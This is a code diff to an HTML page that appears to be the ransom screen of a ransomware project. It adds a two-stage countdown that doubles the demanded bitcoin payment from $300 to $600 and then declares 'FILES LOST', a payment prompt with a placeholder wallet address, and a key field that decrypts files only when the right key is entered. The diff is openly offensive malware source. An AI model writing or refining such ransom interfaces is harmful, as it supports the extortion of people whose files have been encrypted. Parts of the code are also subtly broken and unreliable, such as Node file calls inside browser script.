@@ -12,34 +12,63 @@
 </header>
 
 <div id="center">
-    <!-- Display the countdown timer in an element -->
-    <script type="text/javascript">
-        let count = 180;
-        const counter = setInterval(timer, 1000);
-
-        function timer() {
-            count = count - 1;
-            if (count === -1) {
-                clearInterval(counter);
-                document.getElementById("timer").innerHTML = "EXPIRED";
-                return;
+    <script>
+        fs.readFile("timer.json", "utf8", function (err, data) {
+            let timerData = {doublingTime: 0, finalTime: 0, price: 0};
+            if (err) {
+                timerData.doublingTime = (new Date).getTime() + 1000 * 5;
+                timerData.finalTime = (new Date).getTime() + 1000 * 10;
+                timerData.price = 300;
+                fs.writeFile("timer.json", JSON.stringify(timerData), (err) => {if (err) throw err});
+            } else {
+                timerData = require("./timer.json");
             }
 
-            let seconds = count % 60;
-            let minutes = Math.floor(count / 60);
-            let hours = Math.floor(minutes / 60);
-            minutes %= 60;
-            hours %= 60;
+            const counter = setInterval(timer, 1000);
 
-            document.getElementById("timer").innerHTML = ("00" + hours).slice(-2) + ":" +
-                ("00" + minutes).slice(-2) + ":" +
-                ("00" + seconds).slice(-2);
-        }
+            function timer() {
+                document.getElementById("sendBitcoin").innerHTML = `Send $${timerData.price} worth of bitcoin to this address:`;
+                let doubleCount = Math.ceil((timerData.doublingTime - (new Date).getTime()) / 1000);
+                let finalCount = Math.ceil((timerData.finalTime - (new Date).getTime()) / 1000);
+
+                let seconds = [doubleCount % 60, finalCount % 60];
+                let minutes = [Math.floor(doubleCount / 60), Math.floor(finalCount / 60)];
+                let hours = [Math.floor(minutes[0] / 60), Math.floor(minutes[1] / 60)];
+                minutes.forEach((i) => {i %= 60});
+                hours.forEach((i) => {i %= 60});
+
+                if (finalCount < 0) {
+                    document.getElementById("finalTimer").innerHTML = "FILES LOST";
+                    clearInterval(counter);
+                    return;
+                } else if (doubleCount < 0) {
+                    timerData.price = 600;
+                    document.getElementById("doublingTimer").innerHTML = "DOUBLED PRICE";
+                    count = timerData.finalTime - (new Date).getTime();
+
+                    document.getElementById("finalTimer").innerHTML = ("00" + hours[1]).slice(-2) + ":" +
+                        ("00" + minutes[1]).slice(-2) + ":" +
+                        ("00" + seconds[1]).slice(-2);
+                } else {
+                    document.getElementById("doublingTimer").innerHTML = ("00" + hours[0]).slice(-2) + ":" +
+                        ("00" + minutes[0]).slice(-2) + ":" +
+                        ("00" + seconds[0]).slice(-2);
+
+                    document.getElementById("finalTimer").innerHTML = ("00" + hours[1]).slice(-2) + ":" +
+                        ("00" + minutes[1]).slice(-2) + ":" +
+                        ("00" + seconds[1]).slice(-2);
+                }
+
+                fs.writeFile("timer.json", JSON.stringify(timerData), (err) => {if (err) throw err});
+            }
+        });
     </script>
     <aside id='left-bar'>
         <img src="GreenLock.png"><br>
-        <p>Time left:</p>
-        <div id='timer'></div>
+        <div>Doubling time:</div>
+        <div id='doublingTimer'></div>
+        <div>Lost forever:</div>
+        <div id='finalTimer'></div>
     </aside>
 
     <article id='info'>
@@ -57,21 +86,38 @@
     </article>
 </div>
 
-<footer>
-    <img src="BitcoinAcceptedHere.png">
-    Enter key here: <input type="text" id="inputKey">
-    <button onclick="checkKey()">Submit</button>
-</footer>
-
 <script>
     function checkKey() {
-        let inputKey = document.getElementById("inputKey").value;
-        console.log(key);
-        if (inputKey === key) {
-            document.getElementById("key").innerHTML = "Correct";
-        }
+        let input = document.getElementById("inputKey").value;
+
+        fs.readFile("key", "utf8", function (err, data) {
+            if (err) throw err;
+            else {
+                if (input === data) {
+                    search(1);
+                    document.getElementById("response").innerHTML = "Decrypted files.";
+                } else {
+                    document.getElementById("response").innerHTML = "lol wrong key";
+                }
+            }
+        });
     }
 </script>
+
+<footer>
+    <img src="BitcoinAcceptedHere.png">
+    <div id="payInput">
+        <div id="sendBitcoin"></div>
+        <div style="border: 2px solid lime;">abcdefghijklmnopqrstuvwxyz</div>
+    </div>
+    <div id="keyInput">
+        Enter key here:<br>
+        <input type="text" id="inputKey">
+        <button onclick="checkKey()">Decrypt</button>
+        <br>
+        <div id="response"></div>
+    </div>
+</footer>
 
 </body>
 </html>
